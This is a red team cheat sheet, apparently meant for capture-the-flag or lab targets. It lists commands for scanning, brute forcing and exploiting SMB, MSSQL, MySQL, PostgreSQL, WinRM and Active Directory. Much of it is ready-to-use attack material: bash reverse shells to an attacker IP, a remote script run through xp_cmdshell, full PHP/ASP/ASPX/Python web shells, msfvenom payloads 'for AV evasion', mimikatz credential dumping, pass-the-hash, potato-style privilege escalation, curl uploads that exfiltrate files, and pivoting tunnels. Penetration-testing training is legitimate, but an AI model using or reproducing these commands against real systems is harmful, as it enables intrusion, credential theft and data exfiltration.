# Red Team Cheat Sheet

---

# Quick Command

```bash
# Linux Find Flag
find / -name '**root.txt**' 2>/dev/null

# Windows Find Flag
gci C:\Users -i '**root.txt**' -File -Recurse -ea SilentlyContinue
```

# References

| Attacker IP | 10.4.4.4 |
| --- | --- |
| Target IP | 10.9.9.9 |
| Target Hostname | dc01 |
| Target Domain | target.com |
| Target Username | john |
| Target Password | Password123! |

# Discovery

## Common Ports and Services

| Port | Service | Proto | OS | Service Type |
| --- | --- | --- | --- | --- |
| 21 | FTP | TCP | Linux / Windows | File Sharing |
| 22 | SSH | TCP | Linux | Remote Login |
| 53 | DNS | TCP/UDP | Windows / Linux | Name Resolution |
| 80 | HTTP | TCP | Windows / Linux | Web Application |
| 135 | RPC / WMI | TCP/UDP | **Windows** | Remote Login |
| 389 | LDAP | TCP/UDP | **Windows (AD)** | Directory Service |
| 443 | HTTPS | TCP | Windows / Linux | Web Application |
| 445 | SMB | TCP | **Windows** | File Sharing |
| 1433 | MSSQL | TCP | **Windows** | Database |
| 3306 | MySQL | TCP | Linux / Windows | Database |
| 3389 | RDP | TCP/UDP | **Windows** | Remote Login |
| 5432 | PostgreSQL | TCP | Linux | Database |
| 5900 | VNC | TCP | Linux / Windows | Remote Login |
| 5985 | WinRM (HTTP) | TCP | **Windows** | Remote Login |
| 5986 | WinRM (HTTPS) | TCP | **Windows** | Remote Login |
| 6379 | Redis | TCP | Linux | Database |
| 27017 | MongoDB | TCP | Linux | Database |

## Scanning

### nc (Linux)

```bash
for port in 21 22 53 80 88 135 139 389 443 445 464 593 636 1433 3306 3389 5432 5900 5985 5986 6379; do nc -zv -w 2 10.9.9.9 $port; done
```

### PowerShell

```powershell
21,22,53,80,88,135,139,389,443,445,464,593,636,1433,3306,3389,5432,5900,5985,5986,6379 | ForEach-Object { [PSCustomObject]@{ Port = $_; Open = (Test-NetConnection 10.9.9.9 -Port $_ -WarningAction SilentlyContinue).TcpTestSucceeded } }
```

### nmap

```bash
# TCP full port scan (first scan)
nmap -p- --min-rate 5000 -T4 10.9.9.9 -oN scan-tcpfast.txt
# Detailed port service scan
nmap -p 22,80 -sC -sV -A -T4 10.9.9.9 -oN scan-tcpfull.txt

# UDP High value port scan
sudo nmap -sU -p 53,67,68,69,123,137,161,389,500,514,520 10.9.9.9 -T4 -oN scan-udp.txt
# UDP full port scan
sudo nmap -sU -p- 10.9.9.9 -T4 --max-retries 2 --host-timeout 2h -oN scan-udp-full.txt

# AD Scan against windows server/DC
nmap -p 88,389,445,464,636 --script ldap*,kerberos*,smb* 10.9.9.9 -oN scan-ad.txt
```

### rustscan

Download .deb installer from https://github.com/bee-san/RustScan/releases

Install with `sudo dpkg -i rustscan.deb`

```bash
rustscan -a 10.9.9.9 -p 21,22,53,80,135,389,443,445,1433,3306,3389,5432,5900,5985,5986,6379
```

rustscan + auto nmap

```bash
rustscan -a 10.9.9.9 --ulimit 5000 -- -sC -sV -oN rustscan.txt
```

# Service Interaction

## Bruteforcing

Common Usernames and Passwords

| Usernames      | Passwords     |
|----------------|---------------|
| admin          | admin         |
| administrator  | admin123      |
| anonymous      | backup        |
| backup         | ftp           |
| developer      | guest         |
| user           | letmein       |
| guest          | password      |
| test           | password123   |
| service        | qwerty        |
| john           | root          |
| ftp            | service       |
| rdp            | smb           |
| smb            | user          |
| ssh            | welcome       |

Usernames: [https://github.com/danielmiessler/SecLists/tree/master/Usernames](https://github.com/danielmiessler/SecLists/tree/master/Usernames)

Passwords: [https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials)

### **Hydra**

Brute force against live services

```bash
hydra -l <username> -P <password_list> <protocol>://<target_ip>

# Examples
hydra -l john -P /usr/share/wordlists/rockyou.txt ssh://10.9.9.9
```

### John

Offline password cracker against captured hashes

## HTTP(S) 80/443

### **Directory Enumeration**

Directory Dictionaries

| Lines | Path |
| --- | --- |
| 4.7K | /usr/share/seclists/Discovery/Web-Content/common.txt |
| 87k | /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt |
| 220k | /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt |

```bash
ffuf -u http://target.com/**FUZZ** -w /usr/share/seclists/Discovery/Web-Content/common.txt -ac
```

### **Subdomain / VHOST Enumeration**

VHOST Dictionaries

| Lines | Path |
| --- | --- |
| 20k | /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt |
| 110k | /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt |
| 160k | https://raw.githubusercontent.com/TheKingOfDuck/fuzzDicts/refs/heads/master/subdomainDicts/main.txt |
| 1.7m | https://raw.githubusercontent.com/TheKingOfDuck/fuzzDicts/refs/heads/master/subdomainDicts/dic1.txt |

```powershell
ffuf -u http://target.com/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host:FUZZ.target.com" -fs 178
```

Finding the right `-fs` filter

```bash
curl -i http://target.com -H "Host:random.target.com"
 
# HTTP/1.1 301 Moved Permanently
# Server: nginx/1.24.0 (Ubuntu)
# Date: Thu, 15 May 2025 09:06:49 GMT
# Content-Type: text/html
**Content-Length: 178**
```

### **HTTP Request Login Brute Force**

```bash
ffuf -u target.com -request req.txt -w users.txt -w passwords.txt -ac
```

FFUF useful flags

| Flags | Usage | Examples |
| --- | --- | --- |
| -e | File extensions to try | `-e .php,.html` |
| --depth | Recursion depth | `--depth 2` |
| -fc | Filter out HTTP status code | `-fc 404` |
| -mc | Match only HTTP status code | `-mc 200` |
| -fs | Filter out response size | `-fs 230` |
| -ml | Match by line count | `-ml 10` |

## Interacting with FTP (21)

### **Discovery**

```bash
nmap 10.9.9.9 -p 21 --script ftp*
```

### **Basic FTP Commands**

```bash
help                             # Get Information
ls -la                           # List files and directories
cd <dir>                         # Change directory
pwd                              # Print current directory
get <file>                       # Download a file
put <file>                       # Upload a file (if permitted)
mget *                           # Download all files (prompts for confirmation)
quit                             # Exit FTP session
```

### **Download all the files one-liner**

```bash
wget -r ftp://10.9.9.9/ --ftp-user=anonymous --ftp-password=anonymous
wget -r --ftp-user=anonymous --ftp-password=anonymous ftp://10.9.9.9/
```

## Interacting with SMB (445)

### **smbmap**

Enumerate available SMB shares and permissions using valid credentials (if available).

```bash
smbmap -H 10.9.9.9
smbmap -u john -p Password123! -H 10.9.9.9
```

### Harvest GPP Credentials

If `SYSVOL` is accessible:

```bash
smbclient //10.9.9.9/SYSVOL -U john
# Search for
# -> Groups.xml
# -> Services.xml
# -> Scheduledtasks.xml
# These may contain encrypted but reversible passwords.
```

### **lookupsid**

If SMB authentication is possible, enumerate domain users and groups

```bash
impacket-lookupsid target.com/john:'Password123!'@10.9.9.9
impacket-lookupsid target.com/john@10.9.9.9 -hashes aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dcc
```

### **smbclient**

Use `smbclient` to interactively browse and download files from accessible shares.

```bash
# List available shares
smbclient -L //10.9.9.9
# -N : don't ask for password/anonymous login
# -U : put in username and enter password when asked

smbclient //10.9.9.9/HR -U john
# Interact within SMB shell

lcd /home/kali/pwn        # Local directory
prompt OFF               # Disable download confirmation
recurse ON               # Enable recursive download
mget *                   # Download all files

# One-Liner: Download Entire Share
smbclient //10.9.9.9/HR -U john%'Password123!' -c "prompt OFF; recurse ON; mget *"
```

### **smbexec**

Command Execution via SMB

```bash
impacket-smbexec target.com/john@10.9.9.9 -hashes aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dcc
```

## Interacting with MSSQL (1433)

### Connection to MSSQL

```bash
# SQL Authentication
impacket-mssqlclient john:'Password123!'@10.9.9.9

# Windows Authentication
impacket-mssqlclient target.com/john:'Password123!'@10.9.9.9 -windows-auth
```

### Basic Enumeration

```sql
# Information Connection
SELECT @@version;
SELECT SYSTEM_USER;
SELECT USER_NAME();
SELECT IS_SRVROLEMEMBER('sysadmin');

# List Databases
SELECT name FROM sys.databases;

# Switch Databases
USE master;

# Get Table Names
SELECT name FROM sys.tables;

# Dump Tables
SELECT * FROM table;
```

### Impersonation

```sql
# Lists logins that are allowed to impersonate other SQL logins
SELECT * FROM sys.server_permissions WHERE permission_name='IMPERSONATE';
# Look for
# -> grantee_principal_id = your login
# -> grantor_principal_id = sa or another high-privileged login

# Impersonating Another Login
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;
# Verify
# Expected output: sa

# Lists other MSSQL servers connected to the current server
EXEC sp_linkedservers;

# Using a Linked Server
EXEC ('SELECT SYSTEM_USER') AT SQL01;
EXEC ('EXEC xp_cmdshell ''whoami''') AT SQL01;
```

### OS Command Execution

```bash
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'powershell -c "iex (irm http://10.4.4.4/shell.ps1)"';
```

## Interacting with LDAP (389)

### Discovery

```bash
nmap 10.9.9.9 -p 389,636 --script ldap*
```

### ldapsearch (Enumerate LDAP manually)

```bash
# Find everything
ldapsearch -x -H ldap://10.9.9.9 -D "john@target.com" -w 'Password123!' -b "DC=target,DC=com"

# Find Domain Users
ldapsearch -x -H ldap://10.9.9.9 -D "john@target.com" -w 'Password123!' \
-b "DC=target,DC=com" "(objectClass=user)" sAMAccountName

# Find Service Accounts
ldapsearch -x -H ldap://10.9.9.9 -D "john@target.com" -w 'Password123!' \
-b "DC=target,DC=com" "(servicePrincipalName=*)"
```

### GetUserSPNs (Kerberoasting)

If LDAP works, always run this.

```bash
impacket-GetUserSPNs target.com/john:'Password123!'
impacket-GetUserSPNs target.com/john -hashes aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dcc

# Request crackable hashes
impacket-GetUserSPNs target.com/john:'Password123!' -request -outputfile kerberoast.hash
```

**Bloodhound**

```bash
bloodhound-python -u john -p 'Password123!' -d target.com -ns 10.9.9.9 -c All
```

[Kerberos Authentication](https://www.notion.so/Kerberos-Authentication-22a9df891b8980259e94cdb92e95e29f?pvs=21)

## Interacting with MySQL (3306)

### Connecting to mysql

```bash
mysql -u john -p 'Password123!' -h 10.9.9.9 -P 3306
```

### Basic Enumeration

```sql
# Identify current MySQL user and host
SELECT USER(), CURRENT_USER();

# Check MySQL version
SELECT VERSION();

# List all databases
SHOW DATABASES;

# Switch to system database
USE mysql;

# List tables
SHOW TABLES;

# Inspect user accounts
SELECT Host, User, authentication_string FROM mysql.user;
```

Old MySQL versions (≤5.7) are more likely vulnerable to FILE/UDF abuse.

### Pivoting

```sql
# Check current user privileges
SHOW GRANTS FOR CURRENT_USER();

# Check global variables
SHOW VARIABLES LIKE '%secure%';
```

Key values to look for:

- `FILE` privilege → allows file read/write
- `SUPER` privilege → required for UDF abuse
- `secure_file_priv = NULL` → unrestricted file access

### Reading Files from the Host (FILE Privilege Abuse)

If the user has `FILE` privilege, MySQL can read arbitrary files:

```sql
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('C:/Windows/System32/drivers/etc/hosts');
```

### Writing Files to Disk (Web Shell Scenario)

If `secure_file_priv` allows writing and the web root is known:

```sql
SELECT "<?php system($_GET['cmd']); ?>" 
INTO OUTFILE "/var/www/html/shell.php";
```

Exploitation

```sql
curl "http://10.9.9.9/shell.php?cmd=id"
curl "http://10.9.9.9/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.4.4.4/4444+0>%261'"
```

### User-Defined Functions (UDF) Command Execution

If user has `SUPER` privilege and can write to MySQL plugin directory

```sql
SHOW VARIABLES LIKE 'plugin_dir';
```

Typical plugin paths

```sql
# Linux
/usr/lib/mysql/plugin/
/usr/lib64/mysql/plugin/
/usr/lib/x86_64-linux-gnu/mariadb19/plugin/

# Windows
C:\Program Files\MySQL\MySQL Server 5.7\lib\plugin\
C:\xampp\mysql\lib\plugin\
```

If writable, we can upload malicious so/dll and create UDF to execute OS commands

```sql
# Upload Shared Object
SELECT LOAD_FILE('/tmp/lib_mysqludf_sys.so') # For Linux
SELECT LOAD_FILE('/tmp/mysql_udf.dll') # For Windows
INTO DUMPFILE '/usr/lib/mysql/plugin/lib_mysqludf_sys.so';
INTO DUMPFILE 'C:/Program Files/MySQL/MySQL Server 5.7/lib/plugin/mysql_udf.dll';

# Create UDF
CREATE FUNCTION sys_exec RETURNS INTEGER
SONAME 'lib_mysqludf_sys.so'; # Linux
SONAME 'mysql_udf.dll'; # Windows

# Verify
SELECT sys_exec('id');

# Reverse Shell
SELECT sys_exec('bash -c "bash -i >& /dev/tcp/10.4.4.4/4444 0>&1"'); # Linux
SELECT sys_exec('powershell -c "yBpdCBpb..."')
```

## Interacting with PostgreSQL (5432)

### Discovery

```bash
nmap -p 5432 -sV 10.9.9.9
nmap -p 5432 --script pgsql-info 10.9.9.9
```

### Common Credentials and Brute Force

```bash
postgres : postgres
postgres : password
admin    : admin

hydra -L users.txt -P passwords.txt 10.9.9.9 postgres
```

### Connect with PSQL

```bash
PGPASSWORD='Password123!' psql -h 10.9.9.9 -U john -d postgres
```

### Enumeration

```sql
# List all databases
\l

# Connect to a database
\c targetdb

# List tables
\dt

# Dump table contents
SELECT * FROM users;

# List users and roles
\du

# Check superuser privileges
SELECT usesuper FROM pg_user WHERE usename = current_user;
```

### OS Command Execution (If Superuser)

```sql
# Check if current user is a superuser
SELECT usesuper FROM pg_user WHERE usename = current_user;

# Execute OS command (Linux)
COPY cmd_exec FROM PROGRAM 'id';

# Execute OS command (Windows)
COPY cmd_exec FROM PROGRAM 'whoami';

# Reverse shell to attacker (Linux)
COPY shell FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/10.4.4.4/4444 0>&1"';
```

### File Read / Write (If Allowed)

```sql
# Read file
COPY (SELECT pg_read_file('/etc/passwd', 0, 10000)) TO STDOUT;

# Write file
COPY (SELECT 'test') TO '/tmp/test.txt';
```

### Credential Harvesting

```sql
SELECT usename, passwd FROM pg_shadow;
```

## Interacting with WinRM (5985)

### Connecting with evil-winrm

```bash
evil-winrm -i 10.9.9.9 -u john -p 'Password123!'
evil-winrm -i 10.9.9.9 -u target.com\\john -p 'Password123!'
evil-winrm -i 10.9.9.9 -u john -H 3219d49c9edfb7dbd74d76c37cdcb674
```

### File Transfer

```bash
upload linpeas.exe
download proof.txt
```

## Interacting with Git

```bash
# Find .git folders
find / -type d -name ".git" 2>/dev/null

# Check git status
git status

# View git log full commit history
git log --oneline --all --graph

# Check differences between commits
git diff 8ad0f31 dfef9f2

# Check commit messages and diffs for all commits
git log -p

# Recover deleted files from commits
# In commit example dfef9f2, where log shows commit dfef9f2 delete **** app/test.py
git checkout dfef9f2^ -- app/test.py

# Recover delete files from working folder (not commited yet)
# -- recover all
git restore .
# -- recover specific file
git restore app/test.py
```

# Reverse Shells

Useful tool: [https://www.revshells.com/](https://www.revshells.com/)

## Stabilizing a Reverse Shell (TTY Upgrade)

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'    # upgrade dumb shell to bash PTY
python -c 'import pty; pty.spawn("/bin/sh")'       # fallback if python3 missing
/usr/bin/script -qc /bin/bash /dev/null            # fallback if python missing

Ctrl+Z                                             # background the shell
stty raw -echo;fg                                  # fix input handling, resume shell
ENTER ENTER                                        # press if prompt not visible

export TERM=xterm                                  # enable full terminal features
stty size                                          # run locally to get rows/cols
stty rows 41 cols 225                              # set correct terminal size on target
```

## Windows Reverse Shells

### msfvenom stageless shell

```bash
# Output as Windows x64 executable (stageless)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.4.4.4 LPORT=443 -f exe -o shell.exe

# Output as C byte array (for custom loaders / AV evasion)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.4.4.4 LPORT=443 -f c
```

### meterpreter shell

```bash
# Staged Meterpreter reverse shell (Windows x64)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.4.4.4 LPORT=443 -f exe -o shell.exe

# Multi-stage shellcode encoding
d

# Metasploit listener
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 10.4.4.4; set LPORT 443; set ExitOnSession false; exploit -j -z"

```

### nc.exe (netcat for windows)

```bash
wget https://raw.githubusercontent.com/voidexec/sec/refs/heads/main/nc64.exe
# Reverse shell using PowerShell
nc64.exe 10.4.4.4 9001 -e powershell
```

## Webshell

### PHP

```php
<html><body><form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>"><input type="TEXT" name="cmd" autofocus id="cmd" size="80"><input type="SUBMIT" value="Execute"></form><pre><?php if(isset($_GET['cmd'])){system($_GET['cmd'].' 2>&1');} ?></pre></body></html>
```

### ASP

```vbnet
<%Set oScript=Server.CreateObject("WSCRIPT.SHELL"):Set oScriptNet=Server.CreateObject("WSCRIPT.NETWORK"):Set oFileSys=Server.CreateObject("Scripting.FileSystemObject"):Function getCommandOutput(theCommand):Dim objShell,objCmdExec:Set objShell=CreateObject("WScript.Shell"):Set objCmdExec=objShell.exec(theCommand):getCommandOutput=objCmdExec.StdOut.ReadAll:End Function%><HTML><BODY><FORM action="" method="GET"><input type="text" name="cmd" size=45 value="<%=szCMD%>"><input type="submit" value="Run"></FORM><PRE><%szCMD=Request("cmd"):thisDir=getCommandOutput("cmd /c"&szCMD):Response.Write(thisDir)%></BODY></HTML>
```

### ASPX

```csharp
<%@ Page Language="C#" %><script runat="server">string Run(string a){var p=new System.Diagnostics.Process{StartInfo=new System.Diagnostics.ProcessStartInfo("cmd","/c "+a){RedirectStandardOutput=true,UseShellExecute=false}};p.Start();return p.StandardOutput.ReadToEnd();}void Exec(object s,System.EventArgs e){Response.Write("<pre>"+Server.HtmlEncode(Run(txt.Text))+"</pre>");}</script><html><body style="margin-top:60px"><form runat="server" style="position:fixed;top:10px;left:10px;z-index:9999;background:#fff;padding:5px">Command:<asp:TextBox id="txt" runat="server" Width="250"/><asp:Button Text="Execute" runat="server" OnClick="Exec"/></form></body></html>
```

### Python

```python
#!/usr/bin/env python3
import cgi
import subprocess
import html
print("Content-Type: text/html\n")
form = cgi.FieldStorage()
cmd = form.getvalue("cmd")
print("""
<html>
<head>
    <style>
        input[type=text] { width: 80%; }
    </style>
</head>
<body>
<form method="GET">
    <input type="text" name="cmd" autofocus>
    <input type="submit" value="Execute">
</form>
<pre>
""")
if cmd:
    output = subprocess.getoutput(cmd)
    print(html.escape(output))
```

# Privilege Escalation

## Linux

### **LINPEAS**

```bash
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
sh linpeas.sh
sh linpeas.sh -a > linpeas.out # Output to file
```

### **LSE (Linux Smart Enumeration)**

[https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)

```sql
wget https://raw.githubusercontent.com/voidexec/sec/refs/heads/main/lse.sh
sh lse.sh
```

### **Binaries Abuse**

[GTFOBins](https://gtfobins.github.io/)

### SUID / SGID

**SUID** (Set User ID) : When set on an executable, it runs with the file owner’s privileges (commonly root), not the invoking user.

**SGID** (Set Group ID) When set on an executable, it runs with the file’s group privileges. When set on a directory, new files inherit the directory’s group, which can allow access to restricted.

```bash
find / -perm -4000 -type f 2>/dev/null        # Find all SUID binaries
find / -perm -2000 -type f 2>/dev/null        # Find all SGID binaries
```

## Windows

### Mimikatz

Credential extraction (LSA secrets, hashes, plaintext creds).

❗Require local administrator / SYSTEM / domain administrator

[https://github.com/ParrotSec/mimikatz](https://github.com/ParrotSec/mimikatz)

```bash
wget https://raw.githubusercontent.com/voidexec/sec/refs/heads/main/mimikatz.exe

privilege::debug            # Enables required debug privileges
sekurlsa::logonpasswords    # Dumps credentials from memory (most common)
lsadump::sam                # Dumps local user password hashes
lsadump::secrets            # Dumps stored system secrets
token::list                 # Lists available access tokens
token::elevate              # Impersonates a higher-privileged token
```

### Secretsdump

❗Require local administrator / SYSTEM / domain administrator and SMB access to target

```bash
# Basic Authentication
impacket-secretsdump target.com/john:Password123!@10.9.9.9

# Pass-the-hash
impacket-secretsdump target.com/john@10.9.9.9 -hashes aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dcc

# Offline dump
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
# Requires having dumped Windows registry hives on target with administrator
# SYSTEM:    required
# SAM:       required for hashes
# SECURITY:  bonus (nice to have)
```

### WinPEAS

Local privilege escalation enumeration

[https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)

```bash
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASany_ofs.exe

.\winPEASany_ofs.exe > winpeas.out
```

### adPEAS

Active Directory enumeration from a domain-joined host

[https://github.com/61106960/adPEAS](https://github.com/61106960/adPEAS)

```powershell
. .\adPEAS.ps1
Invoke-adPEAS
```

### PrintSpoofer Vulnerability

Abusing `SeImpersonatePrivilege` privilege

```bash
# Check with
whoami /priv
# Look for
SeImpersonatePrivilege        Enabled
```

Exploit with PrintSpoofer

[https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)

```bash
wget https://raw.githubusercontent.com/voidexec/sec/refs/heads/main/PrintSpoofer64.exe

# Spawn interactive shell
PrintSpoofer64.exe -i -c cmd
# Spawn reverse shell
PrintSpoofer64.exe -c "C:\Users\Public\nc64.exe 10.4.4.4 9001 -e powershell"
```

Exploit with GodPotato (newer and more automated)

[https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)

```bash
wget https://raw.githubusercontent.com/voidexec/sec/refs/heads/main/godpotato.exe

# Spawn reverse shell
.\godpotato.exe -c "powershell -e JABjAGwAaQBlAG4AdAAgA..."
```

### Run as another user

With GUI

```bash
runas /user:Administrator cmd
```

Without GUI (with PsExec)

```bash
# Download
https://raw.githubusercontent.com/voidexec/sec/refs/heads/main/PsExec.exe

.\psexec.exe -u Administrator -p 'Password123!' cmd.exe
```

### **Active Directory Abuses**

Run bloodhound python collector

```bash
bloodhound-python -u john -p 'Password123!' -ns 10.9.9.9 -d target.com -c All
```

Example: User `John` has `GenericAll` on group `SERVICE ACCOUNTS`

Useful tool: [https://github.com/CravateRouge/bloodyAD](https://github.com/CravateRouge/bloodyAD)

```bash
# Add john to SERVICE ACCOUNTS
bloodyAD --host 10.9.9.9 -u john -p Password123! -d target.com add groupMember 'CN=SERVICE ACCOUNTS,CN=USERS,DC=TARGET,DC=COM' 'CN=JOHN DOE,CN=USERS,DC=TARGET,DC=COM'

# Set john to be the owner of SERVICE ACCOUNTS
bloodyAD --host 10.9.9.9 -u john -p Password123! -d target.com set owner 'CN=SERVICE ACCOUNTS,CN=USERS,DC=TARGET,DC=COM' 'CN=JOHN DOE,CN=USERS,DC=TARGET,DC=COM'

# Set john to have genericAll on SERVICE ACCOUNTS
bloodyAD --host 10.9.9.9 -u john -p Password123! -d target.com add genericAll 'CN=SERVICE ACCOUNTS,CN=USERS,DC=TARGET,DC=COM' 'CN=JOHN DOE,CN=USERS,DC=TARGET,DC=COM'

# Check john membership
bloodyAD --host 10.9.9.9 -u john -p Password123! -d target.com get membership 'CN=JOHN DOE,CN=USERS,DC=TARGET,DC=COM'
```

Example: User `john` has `GenericWrite` access to user `account_operator`

- Option 1: Targeted Kerberoasting

```bash
python3 targetedKerberoast.py -d target.com -u john -p 'Password123!' --dc-ip 10.9.9.9
# Crack with hashcat
hashcat -m 13100 -a 0 hash.txt rockyou.txt
```

- Option 2: Shadow Credentials Abuse

```bash
certipy shadow auto -username john@target.com -p 'Password123!' -account cert_admin -dc-ip 10.9.9.9 -ns 10.9.9.9
# Make sure to include domain in the username (UPN format)
```

Example: Tombstone Accounts

```bash
# List Tombstone Accounts
Get-ADObject -Filter 'isDeleted -eq $true -and objectClass -eq "user"' -IncludeDeletedObjects

# Recover Tombstone Accounts
Get-ADObject -Filter 'samaccountname -eq "cert_admin"' -IncludeDeletedObjects | Restore-ADObject
```

### Active Directory Certificate Abuses

Useful tool: [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

Certipy helps to discover vulnerable certificate templates and abuse them for access

Example: ESC15 user `john` has write permissions on certificate template

```bash
# Identify Template ACL Abuse
certipy find -u john@target.com -p 'Password123!' -dc-ip 10.9.9.9 -vulnerable

# Modify the Certificate Template
certipy template -u john@target.com -p 'Password123!' -template SecureTemplate

# Request Certificate as Administrator
certipy req -u john -p 'Password123!' -target dc01.target.com -ca 'target-CA-1' -template 'WebServer' -upn 'Administrator' -application-policies 'Client Authentication' -dc-ip '10.9.9.9'

# Authenticate as Administrator
certipy auth -pfx administrator.pfx
```

### **Binaries Abuse**

[LOLBAS](https://lolbas-project.github.io/)

# Pivoting

## File Transfer

### HTTP

```bash
# Download
wget https://raw.githubusercontent.com/voidexec/sec/refs/heads/main/httpserver.py

# Host the server
python3 httpserver.py
python3 httpserver.py -p 80
```

Download

```bash
# Linux
curl http://10.4.4.4:8000/linpeas.sh -o linpeas.sh

# Windows
iwr http://10.4.4.4:8000/winpeas.exe -OutFile winpeas.exe
curl.exe http://10.4.4.4:8000/winpeas.exe -O winpeas.exe
```

Upload

```bash
# Linux
curl -F 'file=@/tmp/linpeas.out' http://10.4.4.4:8000/

# Windows
curl.exe -F "file=@C:\Users\Public\winpeas.out" http://10.4.4.4:8000/
# Windows PowerShell Legacy
Add-Type -AssemblyName System.Net.Http; $filePath="C:\Users\Public\winpeas.out"; $uri="http://10.4.4.4:8000/"; $client=[System.Net.Http.HttpClient]::new(); $fs=[System.IO.File]::OpenRead($filePath); $content=[System.Net.Http.MultipartFormDataContent]::new(); $fileContent=[System.Net.Http.StreamContent]::new($fs); $fileContent.Headers.ContentDisposition=[System.Net.Http.Headers.ContentDispositionHeaderValue]::new('form-data'); $fileContent.Headers.ContentDisposition.Name='file'; $fileContent.Headers.ContentDisposition.FileName=[System.IO.Path]::GetFileName($filePath); $content.Add($fileContent); $client.PostAsync($uri, $content).GetAwaiter().GetResult(); $fs.Dispose(); $client.Dispose()
```

### SMB

```bash
# Start the SMB server
impacket-smbserver share . -smb2support -username admin -password admin

# On windows target
# Download
copy \\10.4.4.4\share\winpeas.exe .
# Upload
copy winpeas.exe \\10.4.4.4\share\
```

## Port Forwarding

### Introduction

**Local Port Forwarding**: Let your attacker machine access a service on the target machine as if it were running locally.

**Remote Port forwarding:** Let the target machine access a service running on your attacker machine.

**Dynamic Port Forwarding:** Creates a SOCKS proxy that allows your attacker machine to access services through the target.

### SSH

**Local Port Forwarding**

```bash
# Syntax
ssh -L [local_port]:[remote_host]:[remote_port] [user]@[target_ip]
# Example: Forward target service MySQL on port 3306 to local port 3306
ssh -L 3306:localhost:3306 john@10.9.9.9
# Multiple local port forwarding
ssh -L 3306:localhost:3306 -L 3389:localhost:3389 john@10.9.9.9
```

**Remote Port Forwarding**

```bash
 # Syntax
ssh -R <remote_port>:<local_host>:<local_port> <user>@<attacker_ip>
# Example: Expose local port 8000 to target on port 8000
ssh -R 8000:localhost:8000 john@10.4.4.4
```

**Dynamic Port Forwarding**

```bash
# Syntax
ssh -D [local_port] [user]@[target_ip]
# Example: Create a local SOCKS proxy on 127.0.0.1:1080
ssh -D 1080 john@10.9.9.9
```

### Chisel

[https://github.com/jpillora/chisel/releases](https://github.com/jpillora/chisel/releases)

Setup Chisel Server (Run on attacker machine 10.4.4.4)

```bash
chisel server -p 10000 --reverse
```

> —reverse allows target machines to connect back to the attacker machine, in case the target machine cannot be directly reached, for example due to inbound firewall control.
> 

**Local Port Forwarding**

```bash
# Example: Expose target MySQL 3306 service to attacker on localhost 3306
chisel client 10.4.4.4:10000 R:3306:localhost:3306
```

**Reverse Port Forwarding**

```bash
# Example: Expose local port 8000 to target on port 8000
# Port 8080 opened on target machine and connection is proxied to localhost 8080
chisel client 10.4.4.4:10000 R:8000:127.0.0.1:8000
```

**Dynamic Port Forwarding**

```bash
# Example: Establish SOCKS proxy on attacker machine port 5000.
# Through this proxy, we can access any services the target machine can access
chisel client 10.4.4.4:10000 R:5000:socks
```

### ProxyChains

ProxyChains routes tool traffic through a SOCKS proxy

```bash
# Install
sudo apt -y update
sudo apt -y install proxychains

cp /etc/proxychains.conf proxy.conf
# Add to the bottom of proxy.conf
socks5 127.0.0.1 1080

# Example Usage
proxychains -f proxy.conf nmap -Pn 192.168.9.9
```

### Ligolo-ng

> Chisel + ProxyChains + routing, but cleaner and more powerful.
> 

Setup `Ligolo` proxy (Attacker)

```bash
sudo ./ligolo-proxy -selfcert
# Listens on 0.0.0.0:11601 by default
# Creates a Ligolo terminal
```

Run `Ligolo` Agent (Target)

```bash
./ligolo-agent -connect 10.4.4.4:11601
ligolo-agent.exe -connect 10.4.4.4:11601
```

Setup TUN Interface (Attacker)

```bash
# In a new session
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
```

Attach Session in `Ligolo` Terminal

```bash
session
select 1
start
```

Add Routes to Internal Network

```bash
# target can access 192.168.9.0/24
sudo ip route add 192.168.9.0/24 dev ligolo
```

You can now run tools **normally**, without ProxyChains:

```bash
nmap -Pn 192.168.9.9
evil-winrm -i 192.168.9.9 -u john -p Password123!

```
